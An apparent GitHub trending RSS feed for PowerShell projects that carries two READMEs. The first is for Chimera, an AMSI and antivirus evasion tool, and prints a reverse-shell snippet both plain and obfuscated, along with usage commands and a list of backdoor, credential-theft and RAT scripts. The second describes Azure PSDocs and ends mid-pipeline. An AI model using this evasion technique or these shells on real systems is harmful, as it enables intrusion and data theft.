<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-01-03T01:35:42Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>tokyoneon/Chimera</title>
    <updated>2024-01-03T01:35:42Z</updated>
    <id>tag:github.com,2024-01-03:/tokyoneon/Chimera</id>
    <link href="https://github.com/tokyoneon/Chimera" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Chimera is a (shiny and very hack-ish) PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1&#39;s known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/tokyoneon/Chimera/master/images/chimera.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Chimera was created for &lt;a href=&#34;https://null-byte.com/bypass-amsi-0333967/&#34;&gt;this write-up&lt;/a&gt; and is &lt;a href=&#34;https://github.com/tokyoneon/Chimera#resources&#34;&gt;further evidence&lt;/a&gt; of how trivial it is to bypass detection signatures. Hopefully, this repository will inspire someone to build something robust and more reliable.&lt;/p&gt; &#xA;&lt;h2&gt;How Chimera works...&lt;/h2&gt; &#xA;&lt;p&gt;Below is a snippet of Nishang&#39;s &lt;a href=&#34;https://raw.githubusercontent.com/tokyoneon/Chimera/master/shells/Invoke-PowerShellTcp.ps1&#34;&gt;Invoke-PowerShellTcp.ps1&lt;/a&gt;, found at &lt;a href=&#34;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1&#34;&gt;nishang/Shells&lt;/a&gt;. VirusTotal reports &lt;a href=&#34;https://www.virustotal.com/gui/file/0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868/detection&#34;&gt;25 detections&lt;/a&gt; of the PS1 script.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$stream = $client.GetStream()&#xA;[byte[]]$bytes = 0..65535|%{0}&#xA;&#xA;#Send back current username and computername&#xA;$sendbytes = ([text.encoding]::ASCII).GetBytes(&#34;Windows PowerShell running as user &#34; + $env:username + &#34; on &#34; + $env:computername + &#34;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&#34;)&#xA;$stream.Write($sendbytes,0,$sendbytes.Length)&#xA;&#xA;#Show an interactive PowerShell prompt&#xA;$sendbytes = ([text.encoding]::ASCII).GetBytes(&#39;PS &#39; + (Get-Location).Path + &#39;&amp;gt;&#39;)&#xA;$stream.Write($sendbytes,0,$sendbytes.Length)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/tokyoneon/Chimera/master/images/chimera-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;And here it is again, after Chimera. VirusTotal reports &lt;a href=&#34;https://www.virustotal.com/gui/file/74a47198fefa10a8ebb88a8b130259e56a5a9fc4302089ac73009742ba5c98dc/detection&#34;&gt;0 detections&lt;/a&gt; of the obfuscated version.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;  # Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.&#xA;              $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov = $jYODNAbvrcYMGaAnZHZwE.&#34;$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS&#34;()&#xA;       # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.&#xA;          [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN = 0..65535|%{0}&#xA;   # Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, in ship-to-ship combat.&#xA;&#xA;  # Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.&#xA;           # Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.&#xA;   # Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.&#xA;           $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK = ([teXt.enCoDInG]::AsCII).&#34;$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm&#34;(&#34;WInDows Powershell rUnnInG As User &#34; + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + &#34; on &#34; + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + &#34;`nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.`n`n&#34;)&#xA;# Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.&#xA;            $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)&#xA;   # An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/tokyoneon/Chimera/master/images/chimera-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Chimera does several things to obfuscate the source. The &lt;code&gt;transformer&lt;/code&gt; function will separate strings into multiple pieces and reconstruct them as new variables.&lt;/p&gt; &#xA;&lt;p&gt;For example, it will take a string like &lt;code&gt;... New-Object System.Net.Sockets.TCPClient ...&lt;/code&gt; and convert it to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$a = &#34;Syste&#34;&#xA;$b = &#34;m.Net.Soc&#34;&#xA;$c = &#34;kets.TCP&#34;&#xA;$d = &#34;Client&#34;&#xA;&#xA;... New-Object $a$b$c$d ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The function separates commonly flagged data types and strings into several chunks. It defines the chunks and concatenates them at the top of the script. A higher &lt;code&gt;--level&lt;/code&gt; will result in smaller chunks and more variables.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$CNiJfmZzzQrqZzqKqueOBcUVzmkVbllcEqjrbcaYzTMMd = &#34;`m&#34;&#xA;$quiyjqGdhQZgYFRdKpDGGyWNlAjvPCxQTTbmFkvTmyB = &#34;t`Rea&#34;&#xA;$JKflrRllAqgRlHQIUzOoyOUEqVuVrqqCKdua = &#34;Get`s&#34;&#xA;$GdavWoszHwDVJmpYwqEweQsIAz = &#34;ti`ON&#34;&#xA;$xcDWTDlvcJfvDZCasdTnWGvMXkRBKOCGEANJpUXDyjPob = &#34;`L`O`Ca&#34;&#xA;$zvlOGdEJVsPNBDwfKFWpvFYvlgJXDvIUgTnQ = &#34;`Get`-&#34;&#xA;$kvfTogUXUxMfCoxBikPwWgwHrvNOwjoBxxto = &#34;`i&#34;&#xA;$tJdNeNXdANBemQKeUjylmlObtYp = &#34;`AsC`i&#34;&#xA;$mhtAtRrydLlYBttEnvxuWkAQPTjvtFPwO = &#34;`G&#34;&#xA;$PXIuUKzhMNDUYGZKqftvpAiQ = &#34;t`R`iN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Clone the repository. Tested in Kali v2020.3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git&#xA;sudo git clone https://github.com/tokyoneon/chimera /opt/chimera&#xA;sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/&#xA;sudo chmod +x chimera.sh; ./chimera.sh --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Basic usage.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\&#xA;copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\&#xA;invoke-expression,out-string,write-error -j -g -k -r -p&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Review the &lt;a href=&#34;https://raw.githubusercontent.com/tokyoneon/Chimera/master/USAGE.md&#34;&gt;usage guide&lt;/a&gt; and &lt;a href=&#34;https://null-byte.com/bypass-amsi-0333967/&#34;&gt;write-up&lt;/a&gt; for more examples and screenshots.&lt;/p&gt; &#xA;&lt;h2&gt;Shells&lt;/h2&gt; &#xA;&lt;p&gt;In the &lt;code&gt;shells/&lt;/code&gt; directory are several Nishang scripts and a few generic ones. All have been tested and should work fine. But there&#39;s no telling how untested scripts will reproduce with Chimera...&lt;/p&gt; &#xA;&lt;p&gt;Change the hardcoded IP addresses.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sed -i &#39;s/192.168.56.101/&amp;lt;YOUR-IP-ADDRESS&amp;gt;/g&#39; shells/*.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;ls -laR shells/&#xA;&#xA;shells/:&#xA;total 60&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 1727 Aug 29 22:02 generic1.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 1433 Aug 29 22:02 generic2.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon  734 Aug 29 22:02 generic3.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 4170 Aug 29 22:02 Invoke-PowerShellIcmp.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon  281 Aug 29 22:02 Invoke-PowerShellTcpOneLine.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 4404 Aug 29 22:02 Invoke-PowerShellTcp.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon  594 Aug 29 22:02 Invoke-PowerShellUdpOneLine.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 5754 Aug 29 22:02 Invoke-PowerShellUdp.ps1&#xA;drwxrwx--- 1 tokyoneon tokyoneon 4096 Aug 28 23:27 misc&#xA;-rwxrwx--- 1 tokyoneon tokyoneon  616 Aug 29 22:02 powershell_reverse_shell.ps1&#xA;&#xA;shells/misc:&#xA;total 36&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 1757 Aug 12 19:53 Add-RegBackdoor.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 3648 Aug 12 19:53 Get-Information.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon  672 Aug 12 19:53 Get-WLAN-Keys.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 4430 Aug 28 23:31 Invoke-PortScan.ps1&#xA;-rwxrwx--- 1 tokyoneon tokyoneon 6762 Aug 29 00:27 Invoke-PoshRatHttp.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/danielbohannon/Invoke-Obfuscation&#34;&gt;Invoke-Obfuscation&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/RythmStick/AMSITrigger&#34;&gt;AMSITrigger&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/cobbr/PSAmsi&#34;&gt;PSAmsi&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://amsi.fail/&#34;&gt;amsi.fail&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/trustedsec/unicorn&#34;&gt;Unicorn&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.wolfandco.com/insight/behind-enemy-lines-pen-tester%E2%80%99s-take-evading-amsi&#34;&gt;www.wolfandco.com&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Azure/PSDocs.Azure</title>
    <updated>2024-01-03T01:35:42Z</updated>
    <id>tag:github.com,2024-01-03:/Azure/PSDocs.Azure</id>
    <link href="https://github.com/Azure/PSDocs.Azure" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Generate documentation from Azure infrastructure as code (IaC) artifacts.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PSDocs for Azure&lt;/h1&gt; &#xA;&lt;p&gt;Generate markdown from Azure infrastructure as code (IaC) artifacts.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://dev.azure.com/PSDocs/PSDocs.Azure/_apis/build/status/PSDocs.Azure-CI?branchName=main&#34; alt=&#34;ci-badge&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Features of PSDocs for Azure include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/overview.md#ready-to-go&#34;&gt;Ready to go&lt;/a&gt; - Use pre-built templates.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/overview.md#devops&#34;&gt;DevOps&lt;/a&gt; - Generate within a continuous integration (CI) pipeline.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/overview.md#cross-platform&#34;&gt;Cross-platform&lt;/a&gt; - Run on MacOS, Linux, and Windows.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;This project uses GitHub Issues to track bugs and feature requests. Please search the existing issues before filing new issues to avoid duplicates.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For new issues, file your bug or feature request as a new &lt;a href=&#34;https://github.com/Azure/PSDocs.Azure/issues&#34;&gt;issue&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;For help, discussion, and support questions about using this project, join or start a &lt;a href=&#34;https://github.com/Azure/PSDocs.Azure/discussions&#34;&gt;discussion&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you have any problems with the &lt;a href=&#34;https://github.com/microsoft/PSDocs&#34;&gt;PSDocs&lt;/a&gt; engine, please check the project GitHub &lt;a href=&#34;https://github.com/microsoft/PSDocs/issues&#34;&gt;issues&lt;/a&gt; page instead.&lt;/p&gt; &#xA;&lt;p&gt;Support for this project/ product is limited to the resources listed above.&lt;/p&gt; &#xA;&lt;h2&gt;Getting the modules&lt;/h2&gt; &#xA;&lt;p&gt;This project requires the &lt;code&gt;PSDocs&lt;/code&gt; PowerShell module. For details on each see &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/install-instructions.md&#34;&gt;install&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can download and install these modules from the PowerShell Gallery.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Module&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;   &lt;th&gt;Downloads / instructions&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PSDocs.Azure&lt;/td&gt; &#xA;   &lt;td&gt;Generate documentation from Azure infrastructure as code (IaC) artifacts.&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.powershellgallery.com/packages/PSDocs.Azure&#34;&gt;latest&lt;/a&gt; / &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/install-instructions.md&#34;&gt;instructions&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;The follow example uses PSDocs for Azure to generate markdown from an Azure template. The source template and generated output are provided below.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/templates/storage/v1/template.json&#34;&gt;Azure template&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/templates/storage/v1/README.md&#34;&gt;Output markdown&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For frequently asked questions, see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/overview.md#frequently-asked-questions-faq&#34;&gt;FAQ&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Annotate templates files&lt;/h3&gt; &#xA;&lt;p&gt;In its simplest structure, an Azure template has the following elements:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,&#xA;  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,&#xA;  &#34;parameters&#34;: {  },&#xA;  &#34;variables&#34;: {  },&#xA;  &#34;functions&#34;: [  ],&#xA;  &#34;resources&#34;: [  ],&#xA;  &#34;outputs&#34;: {  }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Additionally a &lt;code&gt;metadata&lt;/code&gt; property can be added in most places throughout the template. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,&#xA;    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,&#xA;    &#34;metadata&#34;: {&#xA;        &#34;name&#34;: &#34;Storage Account&#34;,&#xA;        &#34;description&#34;: &#34;Create or update a Storage Account.&#34;&#xA;    },&#xA;    &#34;parameters&#34;: {&#xA;        &#34;storageAccountName&#34;: {&#xA;            &#34;type&#34;: &#34;string&#34;,&#xA;            &#34;metadata&#34;: {&#xA;                &#34;description&#34;: &#34;The name of the Storage Account.&#34;&#xA;            }&#xA;        },&#xA;        &#34;tags&#34;: {&#xA;            &#34;type&#34;: &#34;object&#34;,&#xA;            &#34;metadata&#34;: {&#xA;                &#34;description&#34;: &#34;Tags to apply to the resource.&#34;,&#xA;                &#34;example&#34;: {&#xA;                    &#34;service&#34;: &#34;&amp;lt;service_name&amp;gt;&#34;,&#xA;                    &#34;env&#34;: &#34;prod&#34;&#xA;                }&#xA;            }&#xA;        }&#xA;    },&#xA;    &#34;resources&#34;: [&#xA;    ],&#xA;    &#34;outputs&#34;: {&#xA;        &#34;resourceId&#34;: {&#xA;            &#34;type&#34;: &#34;string&#34;,&#xA;            &#34;value&#34;: &#34;[resourceId(&#39;Microsoft.Storage/storageAccounts&#39;, variables(&#39;storageAccountName&#39;))]&#34;,&#xA;            &#34;metadata&#34;: {&#xA;                &#34;description&#34;: &#34;A unique resource identifier for the storage account.&#34;&#xA;            }&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This metadata and the template structure itself can be used to dynamically generate documentation. Documenting templates in this way allows you to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Include meaningful information with minimal effort.&lt;/li&gt; &#xA; &lt;li&gt;Use DevOps culture to author infrastructure code and documentation side-by-side. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Review pull requests (PR) with changes and documentation together.&lt;/li&gt; &#xA;   &lt;li&gt;Use continuous integration and deployment to release changes.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Keep documentation up-to-date. No separate wiki or document to keep in sync.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;PSDocs interprets the template structure and metadata to generate documentation as markdown. Generating documentation as markdown allows you to publish web-based content on a variety of platforms.&lt;/p&gt; &#xA;&lt;p&gt;PSDocs supports the following metadata:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Field&lt;/th&gt; &#xA;   &lt;th&gt;Scope&lt;/th&gt; &#xA;   &lt;th&gt;Type&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;name&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Template&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Used for markdown page title.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;summary&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Template&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Used as a short description for the markdown page.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Template&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Used as a detailed description for the markdown page.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Parameter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Used as the description for the parameter.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;example&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Parameter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;, &lt;code&gt;boolean&lt;/code&gt;, &lt;code&gt;object&lt;/code&gt;, or &lt;code&gt;array&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;An example use of the parameter. The example is included in the JSON snippet. If an example is not included the default value is used instead.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;ignore&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Parameter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;boolean&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;When &lt;code&gt;true&lt;/code&gt; the parameter is not included in the JSON snippet.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Output&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;string&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Used as the description for the output.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;An example of an Azure Storage Account template with metadata included is available &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/templates/storage/v1/template.json&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Running locally&lt;/h3&gt; &#xA;&lt;p&gt;To run PSDocs for Azure locally use the &lt;code&gt;Invoke-PSDocument&lt;/code&gt; cmdlet.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Import module&#xA;Import-Module PSDocs.Azure;&#xA;&#xA;# Generate markdown&#xA;Invoke-PSDocument -Module PSDocs.Azure -InputObject &#39;&amp;lt;template_file_path&amp;gt;&#39; -OutputPath out/docs/;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will generate a &lt;code&gt;README.md&lt;/code&gt; in out/docs directory with the generated markdown (also creates out/docs/ directory if it does not exist).&lt;/p&gt; &#xA;&lt;h3&gt;Scanning for templates&lt;/h3&gt; &#xA;&lt;p&gt;To scan for templates in a directory the &lt;code&gt;Get-AzDocTemplateFile&lt;/code&gt; cmdlet can be used.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Import module&#xA;Import-Module PSDocs.Azure;&#xA;&#xA;# Scan for Azure template file recursively in the templates/ directory&#xA;Get-AzDocTemplateFile -Path templates/ | ForEach-Object {&#xA;    # Generate a standard name of the markdown file. i.e. &amp;lt;name&amp;gt;_&amp;lt;version&amp;gt;.md&#xA;    $template = Get-Item -Path $_.TemplateFile;&#xA;    $templateName = $template.Directory.Parent.Name;&#xA;    $version = $template.Directory.Name;&#xA;    $docName = &#34;$($templateName)_$version&#34;;&#xA;&#xA;    # Generate markdown&#xA;    Invoke-PSDocument -Module PSDocs.Azure -OutputPath out/docs/ -InputObject $template.FullName -InstanceName $docName;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In this example template files are stored in a directory structure such as &lt;code&gt;templates/&amp;lt;name&amp;gt;/&amp;lt;version&amp;gt;/template.json&lt;/code&gt;. i.e. &lt;code&gt;templates/storage/v1/template.json&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The example finds all the Azure template files and outputs a markdown file for each in &lt;code&gt;out/docs/&lt;/code&gt;. An example of the generated markdown is available &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/templates/storage/v1/README.md&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Using with Azure Pipelines&lt;/h3&gt; &#xA;&lt;p&gt;The following example shows how to setup Azure Pipelines to generate ARM template documentation in the markdown format. This example copies the generated markdown files to a designated blob storage.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create a new YAML pipeline with the Starter pipeline template.&lt;/li&gt; &#xA; &lt;li&gt;Add a PowerShell task to: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Install &lt;a href=&#34;https://www.powershellgallery.com/packages/PSDocs.Azure&#34;&gt;PSDocs.Azure&lt;/a&gt; module.&lt;/li&gt; &#xA;   &lt;li&gt;Scan for Azure template file recursively in the templates/ directory.&lt;/li&gt; &#xA;   &lt;li&gt;Generate a standard name of the markdown file. i.e. &lt;code&gt;&amp;lt;name&amp;gt;_&amp;lt;version&amp;gt;&lt;/code&gt;.md&lt;/li&gt; &#xA;   &lt;li&gt;Generate the markdown to a specific directory.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Add an &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/devops/pipelines/tasks/deploy/azure-file-copy?view=azure-devops&#34;&gt;AzureFileCopy task&lt;/a&gt; to copy the generated markdown to an Azure Storage Blob container.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;# Example: .azure-pipelines/psdocs-blobstorage.yaml&#xA;&#xA;jobs:&#xA;- job: &#39;generate_arm_template_documentation&#39;&#xA;  displayName: &#39;Generate ARM template docs&#39;&#xA;  pool:&#xA;    vmImage: &#39;windows-2019&#39;&#xA;  steps:&#xA;  # STEP 1: Generate Markdowns using PSDocs&#xA;  - powershell: | &#xA;      Install-Module -Name &#39;PSDocs.Azure&#39; -Repository PSGallery -force;&#xA;        # Scan for Azure template file recursively in the templates/ directory&#xA;        Get-AzDocTemplateFile -Path templates/ | ForEach-Object {&#xA;        